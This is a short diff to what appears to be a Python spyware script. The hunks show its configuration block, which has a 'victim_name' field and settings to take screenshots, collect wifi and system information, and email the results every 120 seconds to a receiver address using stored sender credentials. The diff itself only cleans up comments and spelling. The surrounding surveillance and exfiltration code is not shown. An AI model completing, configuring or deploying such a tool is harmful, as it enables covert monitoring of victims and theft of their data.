@@ -17,12 +17,9 @@ import glob
 
 system = platform.system()
 
-#edit what you want 
-#require email info
-#recomend email send over 60 seconds same with screenshot 
-
+# Configuration Information
 data = {    
-    "info_email_receiver": "",
+    "info_email_receiver": "", # REQUIRED
     "send_info": True,
     "email_send_time": 120,
     "take_screenshot": True,
@@ -31,8 +28,8 @@ data = {
     "get_wifi_info": True,
     "system_info": True,
     "victim_name": "",
-    "sender_email_address": "",
-    "sender_email_password": ""
+    "sender_email_address": "", # REQUIRED
+    "sender_email_password": "" # REQUIRED
 }
 
 
@@ -212,4 +209,4 @@ if system == "Linux" or system == "Windows":
 
         
 else:
-    print("Only linux and windows machines are permited!!!")
+    print("Only Linux and Windows machines are permitted!")
